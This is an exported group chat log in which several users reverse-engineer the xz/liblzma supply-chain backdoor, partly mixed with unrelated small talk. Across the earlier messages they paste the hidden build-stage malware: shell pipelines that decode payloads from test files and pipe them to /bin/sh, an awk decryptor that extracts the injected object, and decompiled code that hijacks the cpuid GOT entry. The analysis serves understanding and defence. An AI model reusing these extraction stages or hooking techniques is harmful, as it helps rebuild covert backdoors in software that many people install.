@@ -1,0 +1,1888 @@
+March 30, 2024
+[smx2460]
+smx2460 03/30/2024 6:47 AM
+it allocs some mem, doesn't use it (and does other stuff)
+03/30/2024 6:47 AM
+just to show it's calling them
+03/30/2024 6:46 AM
+it calls lzma_alloc and lzma_free without a purpose
+[smx2460]
+smx2460 03/30/2024 6:23 AM
+this might be somehow matching against symbol names
+03/30/2024 6:23 AM
+but not in the way i expected
+03/30/2024 6:22 AM
+the string goes in the table lookup
+03/30/2024 6:22 AM
+interesting
+03/30/2024 6:21 AM
+found strlen, or at least one of its variants (edited)
+03/30/2024 6:17 AM
+Lmicrolzma_encoder_init_1 does a lot of stuff
+03/30/2024 6:13 AM
+i wonder if it's packed code
+03/30/2024 6:13 AM
+also at some point it calls a function pointer
+03/30/2024 6:13 AM
+some of those tables must contain encoded data
+03/30/2024 6:12 AM
+    `Llzma_simple_props_size_part_0` -> `is_gnu_relro`
+    `Llzip_decode_1` -> `table1`
+    `Lcrc64_clmul_1` -> `table2`
+03/30/2024 6:11 AM
+maybe
+[] smx2460 `0x474E552` is `PT_GNU_RELRO `
+hellobox. 03/30/2024 6:11 AM
+is that for hooking?
+[smx2460]
+smx2460 03/30/2024 6:11 AM
+2 of them in fact
+03/30/2024 6:11 AM
+it's piercing data together from a global lookup table
+03/30/2024 6:06 AM
+0x474E552 is PT_GNU_RELRO 
+03/30/2024 6:06 AM
+    bool Llzma_simple_props_size_part_0(int a1, int a2)
+    {
+      return a1 + a2 == 0x474E552;
+    }
+03/30/2024 6:06 AM
+fuckers
+03/30/2024 6:05 AM
+that's where the interesting stuff happens
+03/30/2024 6:05 AM
+it now switches to full blown indirect calls (edited)
+03/30/2024 6:04 AM
+this gets obfuscated
+03/30/2024 6:04 AM
+wow
+03/30/2024 6:04 AM
+such as lzma_delta_decoder_init_part
+03/30/2024 6:04 AM
+it has actual lzma calls interwined with non-lzma code
+03/30/2024 6:00 AM
+aka Llzma_delta_props_encoder
+03/30/2024 5:59 AM
+it's calling a separate function "stealthy"
+03/30/2024 5:59 AM
+here's the rewritten init function
+03/30/2024 5:59 AM
+      ctx->self = ctx;
+      // store rootkit data before overwrite
+      rootkit_ctx_save(ctx);
+      ctx->prev_got_ptr = ctx->got_ptr;
+      runtime_offset = ctx->head - ctx->self;
+      ctx->runtime_offset = runtime_offset;
+      is_cpuid_got_zero = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset == 0LL;
+      cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 1) + runtime_offset;
+      ctx->got_ptr = cpuid_got_ptr;
+      if ( !is_cpuid_got_zero )
+      {
+        cpuid_got_ptr_1 = cpuid_got_ptr;
+        cpuid_ptr = *(_QWORD *)cpuid_got_ptr;
+        // replace with Llzma_delta_props_encoder
+        *(_QWORD *)cpuid_got_ptr = (char *)*(&Llzma_block_buffer_decode_0 + 2) + runtime_offset;
+        // call Llzma_delta_props_encoder
+        runtime_offset = cpuid((unsigned int)ctx, a2, cpuid_got_ptr, &Llzma_block_buffer_decode_0, v2);
+        // restore original
+        *cpuid_got_ptr_1 = cpuid_ptr;
+      }
+      return runtime_offset;
+03/30/2024 5:56 AM
+    `Llzma_delta_props_decoder` -> `rootkit_ctx_save`
+    `Llzma_block_param_encoder_0` -> `rootkit_init`
+03/30/2024 5:54 AM
+i'm gonna rename stuff
+03/30/2024 5:51 AM
+all these names are bogus
+03/30/2024 5:51 AM
+so yeah
+03/30/2024 5:51 AM
+and Llzma_delta_props_encoder is the actual payload
+03/30/2024 5:51 AM
+so Llzma_block_param_encoder_0 is the initializer
+03/30/2024 5:50 AM
+it replaces it with Llzma_delta_props_encoder
+03/30/2024 5:50 AM
+is replacing the got entry for cpuid
+03/30/2024 5:50 AM
+what this is doing
+03/30/2024 5:50 AM
+ok so
+03/30/2024 5:47 AM
+but from where
+03/30/2024 5:47 AM
+so it might really be extracting more stuff
+03/30/2024 5:46 AM
+      a1[4] = a1;
+      Llzma_delta_props_decoder(a1);
+      a1[5] = a1[2];
+      result = *a1 - a1[4];
+      a1[1] = result;
+      v4 = (char *)*(&Llzma_block_buffer_decode_0 + 1) + result == 0LL;
+      v5 = (char *)*(&Llzma_block_buffer_decode_0 + 1) + result;
+      a1[2] = v5;
+      if ( !v4 )
+      {
+        v7 = v5;
+        v6 = *(_QWORD *)v5;
+        *(_QWORD *)v5 = (char *)*(&Llzma_block_buffer_decode_0 + 2) + result;
+        result = cpuid((unsigned int)a1, a2, v5, &Llzma_block_buffer_decode_0, v2);
+        *v7 = v6;
+      }
+      return result;
+03/30/2024 5:45 AM
+that function is interesting
+03/30/2024 5:45 AM
+uhhh
+03/30/2024 5:44 AM
+i don't think it exists in the actual LZMA code
+03/30/2024 5:44 AM
+lzma_block_param_encoder
+03/30/2024 5:44 AM
+that function
+03/30/2024 5:44 AM
+      if ( call_counter == 1 )
+      {
+        v8[0] = 1LL;
+        memset(&v8[1], 0, 32);
+        v8[5] = (__int64)a2;
+        Llzma_block_param_encoder_0(v8, a2);
+      }
+      ++call_counter;
+      cpuid(a1, &v5, &v6, &v7, v8);
+      return v5;
+03/30/2024 5:43 AM
+hmm or maybe not
+03/30/2024 5:43 AM
+yep
+03/30/2024 5:42 AM
+and they do other stuff
+03/30/2024 5:42 AM
+i'm pretty sure all the LZMA symbol names i see are decoys
+03/30/2024 5:41 AM
+        int success = 1;
+        uint32_t r[4]; // eax, ebx, ecx, edx
+    #if defined(_MSC_VER)
+        // This needs <intrin.h> with MSVC. ICC has it as a built-in
+        // on all platforms.
+        __cpuid(r, 1);
+    #elif defined(HAVE_CPUID_H)
+        // Compared to just using __asm__ to run CPUID, this also checks
+        // that CPUID is supported and saves and restores ebx as that is
+        // needed with GCC < 5 with position-independent code (PIC).
+        success = __get_cpuid(1, &r[0], &r[1], &r[2], &r[3]);
+    #else
+        // Just a fallback that shouldn't be needed.
+        __asm__("cpuid\n\t"
+                : "=a"(r[0]), "=b"(r[1]), "=c"(r[2]), "=d"(r[3])
+                : "a"(1), "c"(0));
+    #endif
+03/30/2024 5:40 AM
+    src/liblzma/check/crc_x86_clmul.h: success = __get_cpuid(1, &r[0], &r[1], &r[2], &r[3]);
+03/30/2024 5:40 AM
+to see what happens
+03/30/2024 5:40 AM
+i'm curious to try and link this into an exe and call the function
+03/30/2024 5:39 AM
+hmmm wait
+03/30/2024 5:38 AM
+probably to extract stage2
+03/30/2024 5:38 AM
+the second time, it calls into lzma
+03/30/2024 5:38 AM
+the first time it's called, it does real cpuid
+03/30/2024 5:38 AM
+so
+03/30/2024 5:37 AM
+this thing is multi stage i think
+03/30/2024 5:37 AM
+ifunc is in the source isn't it?
+hellobox. 03/30/2024 5:35 AM
+i.e., is that how they're hooking the RSA stuff?
+03/30/2024 5:35 AM
+is the ifunc resolver called at init?
+[smx2460]
+smx2460 03/30/2024 5:33 AM
+it calls a function that then calls Llzma_block_param_encoder_0
+03/30/2024 5:33 AM
+get_cpuid is not
+03/30/2024 5:33 AM
+cpuid is legit
+03/30/2024 5:33 AM
+get_cpuid and cpuid
+03/30/2024 5:33 AM
+we have 2 exports
+03/30/2024 5:31 AM
+now we look into it
+03/30/2024 5:30 AM
+    liblzma_la-crc64-fast.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
+ 1
+03/30/2024 5:30 AM
+    p="good-large_compressed.lzma"
+    N=0
+    W=88664
+    xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o
+(edited)
+hellobox. 03/30/2024 5:27 AM
+i doubt there is anything in there without a purpose
+03/30/2024 5:27 AM
+or, rather, what is its purpose?
+[] smx2460 it's a comment.
+hellobox. 03/30/2024 5:26 AM
+yeah, but what does it say?
+[smx2460]
+smx2460 03/30/2024 5:26 AM
+looks like it (edited)
+03/30/2024 5:25 AM
+or maybe it's just a decoy
+03/30/2024 5:24 AM
+it's converting the shell script to lzma? (edited)
+03/30/2024 5:24 AM
+holy piss
+03/30/2024 5:22 AM
+so it is skipped.
+03/30/2024 5:22 AM
+it's #
+03/30/2024 5:22 AM
+    ####Hello####
+    #▒U▒▒$▒
+[smx2460]
+hellobox. i've been wondering what the line after `####Hello####` is for
+smx2460 03/30/2024 5:22 AM
+it's a comment.
+[smx2460]
+smx2460 03/30/2024 5:18 AM
+that doesn't return anything
+03/30/2024 5:17 AM
+hmm
+[smx2460]
+smx2460 03/30/2024 5:08 AM
+    vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
+(edited)
+03/30/2024 5:01 AM
+wtf is zrKcVq
+03/30/2024 5:01 AM
+    P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
+    C="pic_flag=\" $P\""
+    O="^pic_flag=\" -fPIC -DPIC\" DCPH0 quot;
+    R="is_arch_extension_supported"
+    x="__get_cpuid("
+    p="good-large_compressed.lzma"
+    U="bad-3-corrupt_lzma2.xz"
+    [ ! $(uname)="Linux" ] && exit 0
+    eval $zrKcVq
+hellobox. 03/30/2024 4:59 AM
+i saw it in other versions too
+[smx2460]
+hellobox. i've been wondering what the line after `####Hello####` is for
+smx2460 03/30/2024 4:59 AM
+i am likely be missing a sed that removes it (edited)
+[smx2460]
+smx2460 03/30/2024 4:59 AM
+    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
+[] smx2460 ``` $ cat tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" "
+\t_\-" | xz -dc ####Hello#### #▒U▒▒$▒ [...
+hellobox. 03/30/2024 4:59 AM
+i've been wondering what the line after ####Hello#### is for
+[smx2460]
+smx2460 03/30/2024 4:58 AM
+    export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|xz -F raw --lzma1 -dc > backdoor.sh
+03/30/2024 4:53 AM
+    $ cat tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -dc
+    ####Hello####
+    #▒U▒▒$▒
+    [ ! $(uname) = "Linux" ] && exit 0
+    [ ! $(uname) = "Linux" ] && exit 0
+    [ ! $(uname) = "Linux" ] && exit 0
+    [ ! $(uname) = "Linux" ] && exit 0
+    [ ! $(uname) = "Linux" ] && exit 0
+    eval `grep ^srcdir= config.status`
+    if test -f ../../config.status;then
+    eval `grep ^srcdir= ../../config.status`
+    srcdir="../../$srcdir"
+    fi
+    export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
+    ####World####
+(edited)
+03/30/2024 4:50 AM
+    $ grep -aErls "#{4}[[:alnum:]]{5}#{4} DCPH0 quot;
+    tests/files/bad-3-corrupt_lzma2.xz
+hellobox. 03/30/2024 4:49 AM
+ah, so #{4}((:alnum:)){5}#{4}$ is what the ####Hello#### bit is for
+[smx2460]
+smx2460 03/30/2024 4:47 AM
+scary
+03/30/2024 4:47 AM
+tis is so entrenched
+03/30/2024 4:47 AM
+     gl_am_configmake=`grep -aErls "#{4}((:alnum:)){5}#{4} DCPH0 quot; $srcdir/ 2>/dev/null`
+    ... gl_($1)_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_($1)_prefix -d 2>/dev/null'
+    In the first construction, the grep operation found the file tests/files/bad-3-corrupt_lzma2.xz, which, when unpacked, generated the script:
+[] smx2460 yeah i think the private repo commits are xz when it wasn't
+blocked
+hellobox. 03/30/2024 4:31 AM
+yeah i don't remember seeing these right at the top before they got
+nuked
+[nKpEBIR.png]
+ nKpEBIR.png
+12.13 KB External
+[] smx2460 https://github.com/libarchive/libarchive/pull/1587
+hellobox. 03/30/2024 4:30 AM
+looks legit
+[smx2460]
+smx2460 03/30/2024 4:30 AM
+https://bugs.gentoo.org/925415
+03/30/2024 4:29 AM
+yeah i think the private repo commits are xz when it wasn't blocked
+(edited)
+03/30/2024 4:28 AM
+wtf
+03/30/2024 4:28 AM
+https://github.com/libarchive/libarchive/pull/1587
+Fix for uninitialized var by JiaT75 · Pull Request #1587 · libarchi...
+[]
+03/30/2024 4:27 AM
+could be
+03/30/2024 4:26 AM
+mmh not sure actually
+[] smx2460 Click to see attachment
+hellobox. 03/30/2024 4:26 AM
+are those counting the blocked xz repos?
+[smx2460]
+smx2460 03/30/2024 4:26 AM
+(no content)
+[image.png]
+ image.png
+18.38 KB External
+hellobox. 03/30/2024 4:26 AM
+nice to see that all this is getting old bugs fixed though
+[smx2460]
+smx2460 03/30/2024 4:25 AM
+you gotta wonder what private projects he's been contributing to
+03/30/2024 4:25 AM
+(no content)
+[image.png]
+ image.png
+24.68 KB External
+hellobox. 03/30/2024 4:25 AM
+people are scared of ifuncs now lmao
+[smx2460]
+smx2460 03/30/2024 4:22 AM
+https://github.com/llvm/llvm-project/issues/63957
+[clang] Reporting unused function with ifunc resolver · Issue #6395...
+Hello! Clang 16.0.0 and older report a warning when compiling a program
+that uses __attribute__((__ifunc__())) with -Wunused-function. The
+resolver function appears to trigger this when it is only ...
+[]
+[smx2460]
+smx2460 03/30/2024 3:53 AM
+    The attached de-obfuscated script is invoked first after configure, where it
+    decides whether to modify the build process to inject the code.
+hellobox. 03/30/2024 3:51 AM
+but the backdoor apparently didn't work in 5.6.0
+[smx2460]
+smx2460 03/30/2024 3:51 AM
+[] smx2460 or if it only fucks up who builds xz
+hellobox. 03/30/2024 3:51 AM
+no, it seems to target sshd running on end-user systems
+[smx2460]
+smx2460 03/30/2024 3:50 AM
+not who runs the built product (edited)
+03/30/2024 3:50 AM
+or if it only fucks up who builds xz (edited)
+03/30/2024 3:50 AM
+i wonder how fucked up i am
+03/30/2024 3:50 AM
+i ha this before a system update
+03/30/2024 3:50 AM
+    sm@debian:~$ xz --version
+    xz (XZ Utils) 5.6.0
+    liblzma 5.6.0
+[smx2460]
+smx2460 03/30/2024 3:42 AM
+(no content)
+[image.png]
+ image.png
+40.88 KB External
+ 1
+hellobox. 03/30/2024 3:30 AM
+also the hans guy
+[HpSmier.png]
+ HpSmier.png
+5.07 KB External
+hellobox. 03/30/2024 3:13 AM
+this one is less surprising (edited)
+[QEcoMhO.png]
+ QEcoMhO.png
+9.02 KB External
+03/30/2024 3:13 AM
+(no content)
+[URXuayo.png]
+ URXuayo.png
+4.73 KB External
+[friya]
+friya 03/30/2024 2:25 AM
+(took a while to find it)
+03/30/2024 2:24 AM
+(no content)
+[image.png]
+ image.png
+83.86 KB External
+[:cloi:] 1
+03/30/2024 2:23 AM
+Well, nothing against python per se. It's just that I like my ;.
+03/30/2024 2:21 AM
+it beat writing python
+03/30/2024 2:20 AM
+haha yeah, i opened a beer and said oh well
+hellobox. 03/30/2024 2:20 AM
+anyway this shit derailed my entire day
+03/30/2024 2:14 AM
+yeah and just (partially) reverted today (edited)
+[friya]
+friya 03/30/2024 2:13 AM
+oh it was merged
+03/30/2024 2:13 AM
+*get merged
+03/30/2024 2:13 AM
+(only thing)
+[friya]
+hellobox. if this does introduce a vulnerability, it's a pretty subtle
+one <https://github.com/libarchive/liba...
+friya 03/30/2024 2:13 AM
+this what was the thing was trying to merge?
+[friya]
+friya 03/30/2024 2:11 AM
+Github should sit on some juicy information on possible messups in
+access-logs. It's hard to not leak your real IP.
+hellobox. 03/30/2024 2:10 AM
+if this does introduce a vulnerability, it's a pretty subtle one
+https://github.com/libarchive/libarchive/pull/1609/commits/f27c173d17dc807733b3a4f8c11207c3f04ff34f
+[friya]
+friya 03/30/2024 2:10 AM
+...and what other projects they are juggling in parallel
+03/30/2024 2:10 AM
+Man. I so want to know more about the guys behind that account now
+hellobox. 03/30/2024 2:10 AM
+https://github.com/libarchive/libarchive/pull/1609
+03/30/2024 2:08 AM
+i read somewhere that JiaT75 tried to get a vuln merged in libarchive a
+while ago
+[friya]
+friya 03/30/2024 2:08 AM
+Well, github probably put up some heuristics now to detect the stuff if
+it's re-upped, I guess?
+hellobox. 03/30/2024 2:08 AM
+https://github.com/libarchive/libarchive/issues/1672#issuecomment-1072364013
+[friya]
+friya 03/30/2024 2:07 AM
+yeah, i was tempted to grab the binary blob myself
+hellobox. 03/30/2024 2:07 AM
+in case i ever want to take a look at it
+03/30/2024 2:06 AM
+i thought about cloning the repo but figured a million other people
+already did
+[friya]
+friya 03/30/2024 2:05 AM
+Surprises me
+03/30/2024 2:05 AM
+Dear lord. It happens so rarely that they do it manually
+hellobox. 03/30/2024 2:05 AM
+they nuked everything but .github i think
+[pU128pN.png]
+ pU128pN.png
+52.75 KB External
+03/30/2024 2:04 AM
+also missing the period after "disabled"
+03/30/2024 2:03 AM
+huh. on https://github.com/tukaani-project/xz-java" target="_blank"
+rel="noopener noreferrer">xz-java, "GitHub's Terms of Service" is a
+link, but on https://github.com/tukaani-project/xz" target="_blank"
+rel="noopener noreferrer">xz it's not
+[t05nI6e.png]
+ t05nI6e.png
+15.93 KB External
+03/30/2024 2:02 AM
+lmao
+[friya]
+friya 03/30/2024 2:01 AM
+aw
+[image.png]
+ image.png
+17.59 KB External
+03/30/2024 1:59 AM
+interesting thought that
+hellobox. 03/30/2024 1:59 AM
+i wonder if ctors and stuff get executed
+[friya]
+hellobox. because it basically runs the executable
+<https://jmmv.dev/2023/07/ldd-untrusted-binaries.html>
+friya 03/30/2024 1:58 AM
+right!
+[friya]
+friya 03/30/2024 1:58 AM
+i guess the env-vars comes from a template or something he copied
+hellobox. 03/30/2024 1:58 AM
+because it basically runs the executable
+https://jmmv.dev/2023/07/ldd-untrusted-binaries.html
+[friya]
+friya 03/30/2024 1:57 AM
+hm
+[] friya `path="$(ldd $(which sshd 2>/dev/null) | grep liblzma | grep -o
+'/[^ ]*' || echo "")"` would show if...
+hellobox. 03/30/2024 1:57 AM
+it seems to
+[friya]
+friya 03/30/2024 1:56 AM
+path="$(ldd $(which sshd 2>/dev/null) | grep liblzma | grep -o '/[^ ]*' || echo "")"
+would show if liblzma comes via systemd?
+03/30/2024 1:53 AM
+maybe he copied a template or something
+03/30/2024 1:53 AM
+very strange
+hellobox. 03/30/2024 1:52 AM
+it would be ~fine if he had just left it at the version check
+[friya]
+friya 03/30/2024 1:51 AM
+at least he read parts of the announcement mail
+03/30/2024 1:50 AM
+looking at this guys repos, it may not be a joke haha
+03/30/2024 1:50 AM
+dear god
+hellobox. 03/30/2024 1:49 AM
+i mean tbh...
+    # Detect unusual ssh response delays
+    detect_ssh_delays() {
+        local start=$(date +%s%N)
+        echo -e "QUIT" | nc -w 2 localhost 22 > /dev/null 2>&1
+        local end=$(date +%s%N)
+        local delay=$(( (end - start) / 1000000 ))
+        if [ "$delay" -gt 500 ]; then
+            update_result "ssh_delay" "detected"
+        else
+            update_result "ssh_delay" "not detected"
+        fi
+    }
+[friya]
+friya 03/30/2024 1:49 AM
+must be!
+hellobox. 03/30/2024 1:49 AM
+the script?
+[friya]
+friya 03/30/2024 1:48 AM
+complex joke
+hellobox. 03/30/2024 1:46 AM
+(to be fair, it would be pretty unusual if you always had LD_DEBUG
+and/or LD_PROFILE set... but that has nothing to do with this backdoor)
+03/30/2024 1:45 AM
+since it warns you about the "unusual variables" LD_DEBUG or LD_PROFILE
+being set, when the backdoor specifically won't run when they exist.
+(conditions met is supposed to mean you're safe)
+    "not compromised"|"not vulnerable"|"conditions met")
+        echo "Your system appears to be safe from this specific vulnerability."
+03/30/2024 1:43 AM
+so even if it made sense to be checking that environment, i'm pretty
+sure it has the logic exactly backwards
+03/30/2024 1:42 AM
+> Observed requirements for the exploit: > a) TERM environment variable
+is not set > b) argv[0] needs to be /usr/sbin/sshd > c) LD_DEBUG,
+LD_PROFILE are not set > d) LANG needs to be set > e) Some debugging
+environments, like rr, appear to be detected. Plain gdb > appears to be
+detected in some situations, but not others
+03/30/2024 1:41 AM
+for one thing, the environment with which someone would run this script
+runs likely has very little to do with the environment of sshd
+03/30/2024 1:37 AM
+like... what?
+    UNUSUAL_ENV_VARS=("LD_DEBUG" "LD_PROFILE")
+    REQUIRED_ENV_VARS=("LANG")
+    sh
+    env_conditions)
+        echo "Verifying environment conditions that might be exploited by the backdoor."
+        ;;
+    sh
+    "unusual variable detected"|"required variable missing")
+        echo "Potential security risk detected in the environment setup."
+        ;;
+    sh
+    # Check for specific environment conditions
+    check_env_conditions() {
+        for var in "${UNUSUAL_ENV_VARS[@]}"; do
+            if [ -n "${!var-}" ]; then
+                update_result "env_conditions" "unusual variable detected"
+                return
+            fi
+        done
+        for var in "${REQUIRED_ENV_VARS[@]}"; do
+            if [ -z "${!var-}" ]; then
+                update_result "env_conditions" "required variable missing"
+                return
+            fi
+        done
+        update_result "env_conditions" "conditions met"
+    }
+03/30/2024 1:36 AM
+it's more important to be first than to be right, i guess:
+https://github.com/jocxfin/LibLZMA-Backdoor-Detector/blob/main/detect_backdoor.sh#L7
+[] kitsuned https://github.com/tukaani-project/xz/issues/102    
+hellobox. 03/30/2024 1:32 AM
+can't tell if it's a joke
+[kitsuned]
+[] dogelition
+https://archlinux.org/news/the-xz-package-has-been-backdoored/
+kitsuned 03/30/2024 1:30 AM
+https://github.com/tukaani-project/xz/issues/102     
+[Feature Request]: please rewrite this library in rust · Issue #102...
+Describe the Feature About the backdoor report
+(https://www.cve.org/CVERecord?id=CVE-2024-3094), an "easy" fix to
+ensure is impossible to happen again is to rewrite xz in rust. Expected
+C...
+[]
+[maryjohanna42069]
+maryjohanna42069 03/30/2024 12:52 AM
+idk
+03/30/2024 12:52 AM
+could have been an accident
+hellobox. 03/30/2024 12:50 AM
+not sure who would though
+[] maryjohanna42069 i assumed that nsa just walked into the apple
+engineers' office and they worked something out ...
+hellobox. 03/30/2024 12:50 AM
+i didn't watch the presentation, but i'd hope NSA wouldn't blow their
+load (of 0days) on people like this
+[maryjohanna42069]
+maryjohanna42069 03/30/2024 12:41 AM
+its technically turing complete
+03/30/2024 12:40 AM
+i sometimes get too paranoid and start to dream about building a cluster
+of casio calculators as my primary pc
+03/30/2024 12:40 AM
+too bad that this kind of information never leaves certain curtains
+[maryjohanna42069]
+hellobox. could be someone with a clever
+[sandsifter](<https://github.com/xoreaxeaxeax/sandsifter>)-type thing...
+maryjohanna42069 03/30/2024 12:40 AM
+i assumed that nsa just walked into the apple engineers' office and they
+worked something out 
+[smx2460]
+smx2460 03/30/2024 12:39 AM
+WHO PUT SOME TEA IN MY ICE SMOOTHIE
+[smx2460]
+[] infowski Iced tea
+smx2460 03/30/2024 12:39 AM
+xD
+[smx2460]
+smx2460 03/30/2024 12:38 AM
+but i had to do a hack i didn't like to fix a segfault, and some
+variables/fds aren't cleared properly in the process
+[] maryjohanna42069 finding out such a sophisticated chain is one thing,
+but how does one find out about undocumented GP...
+hellobox. 03/30/2024 12:38 AM
+could be someone with a clever
+https://github.com/xoreaxeaxeax/sandsifter" target="_blank"
+rel="noopener noreferrer">sandsifter-type thing... or given that iphones
+are such valuable targets, more likely that a government invested in
+REing the whole thing
+[infowski]
+infowski 03/30/2024 12:38 AM
+Iced tea (edited)
+[PXL_20240327_124810823.jpg]
+ PXL_20240327_124810823.jpg
+371.73 KB External
+[smx2460]
+smx2460 03/30/2024 12:38 AM
+is that it can successfully reload itself and it can detect if it's in
+the "first" or "second" run
+03/30/2024 12:38 AM
+the progress with the interp hack, last time i worked on it
+[smx2460]
+hellobox. you use kaitai for everything
+smx2460 03/30/2024 12:38 AM
+the reason kaitai is in there is that i wanted to also build an ELF
+parser
+[infowski]
+infowski 03/30/2024 12:37 AM
+(no content)
+[PXL_20240325_120027574.jpg]
+ PXL_20240325_120027574.jpg
+863.78 KB External
+[smx2460]
+smx2460 03/30/2024 12:37 AM
+(no content)
+[1-9.jpg]
+ 1-9.jpg
+269.21 KB External
+03/30/2024 12:37 AM
+but he said the landscapes are sick
+03/30/2024 12:37 AM
+(he visited Norway too) (edited)
+[infowski]
+infowski 03/30/2024 12:37 AM
+Also nice calm nature, lots of snow
+[smx2460]
+smx2460 03/30/2024 12:37 AM
+typical  , from what my Uncle told me
+[infowski]
+infowski 03/30/2024 12:36 AM
+Cold, but only a little bit. Also empty
+[smx2460]
+smx2460 03/30/2024 12:36 AM
+how was it?
+[smx2460]
+[] infowski Decent. Just got back from a 4 day trip to Tromsø, really
+busy with work stuff too...
+smx2460 03/30/2024 12:36 AM
+ohh nice
+[infowski]
+[] smx2460 <@501722020434673674> how's it going?
+infowski 03/30/2024 12:36 AM
+Decent. Just got back from a 4 day trip to Tromsø, really busy with work
+stuff too...
+ 1
+hellobox. 03/30/2024 12:35 AM
+maybe i should look into it again (i didn't have a great experience with
+the web IDE iirc) (edited)
+[] smx2460 ``` :~/linker-test$ ls -1 bare_metal.c build CMakeLists.txt
+common.hpp elf_ctx.cpp elf_ctx.hpp elf_l...
+hellobox. 03/30/2024 12:35 AM
+you use kaitai for everything
+ 1
+[smx2460]
+smx2460 03/30/2024 12:35 AM
+@infowski how's it going?
+[infowski]
+infowski 03/30/2024 12:34 AM
+Also, yo @Smx !
+ 1
+[smx2460]
+smx2460 03/30/2024 12:33 AM
+    :~/linker-test$ ls -1
+    bare_metal.c
+    build
+    CMakeLists.txt
+    common.hpp
+    elf_ctx.cpp
+    elf_ctx.hpp
+    elf_load_ctx.cpp
+    elf_load_ctx.hpp
+    elf_mem_ctx.cpp
+    elf_mem_ctx.hpp
+    gdbinit.txt
+    glibc
+    interp_reload_asm.S
+    interp_reload.cpp
+    kaitai
+    kaitai_struct_cpp_stl_runtime
+    lib.c
+    libcrypto.so
+    makedef
+    makedef.cpp
+    makedef.php
+    own-the-libs
+    own-the-libs.tar
+    parser
+    parser.cpp
+    parser.hpp
+    staging
+    util.cpp
+    util.hpp
+this is the state of the mess in that folder 
+[infowski]
+infowski 03/30/2024 12:33 AM
+But not that much better to pay 2+ times the price over used Quest 2
+[smx2460]
+hellobox. the linker wrapper thing?
+smx2460 03/30/2024 12:33 AM
+yep
+[infowski]
+infowski 03/30/2024 12:32 AM
+Quest 3 is decent too, I actually got interested with this after a
+friend of mine brought one to our hackerspace for testing (one he bought
+at €450 with some timed poland-only discount)
+[friya]
+friya 03/30/2024 12:31 AM
+Tempting
+[infowski]
+infowski 03/30/2024 12:31 AM
+Fuck meta but I guess buying used hardware second hand and not buying a
+lot of content is morally okay :^)
+[] smx2460 did I tell you that i kept going with that idea? 
+hellobox. 03/30/2024 12:30 AM
+the linker wrapper thing?
+[infowski]
+infowski 03/30/2024 12:29 AM
+On another unrelated note, Meta Quest 2 tech-per-buck is astonishingly
+high. I heard a lot of bad things about its tracking and all but it
+just... Seems to work. Overall better experience than Vive Gen 1 (which
+costs roughly the same here used) on my RX580 gaming PC x-D (edited)
+ 1
+[friya]
+friya 03/30/2024 12:28 AM
+I've gotten some stuff from Aliexpress that make noise if shake it --
+why I ask :)
+03/30/2024 12:28 AM
+right okay!
+[infowski]
+infowski 03/30/2024 12:28 AM
+Doesn't stand out.
+[infowski]
+[] friya Does it feel like aliexpress or does it feel somewhat solid,
+build-wise?
+infowski 03/30/2024 12:28 AM
+It feels like a generic IPS touch panel, what shall I say... It does
+what it means to do. Not sure if it's that very specific model, but
+seems like there is just one generic design everyone manufactures?
+[friya]
+friya 03/30/2024 12:27 AM
+is that comic sans?
+[image.png]
+ image.png
+3.55 KB External
+03/30/2024 12:27 AM
+Does it feel like aliexpress or does it feel somewhat solid, build-wise?
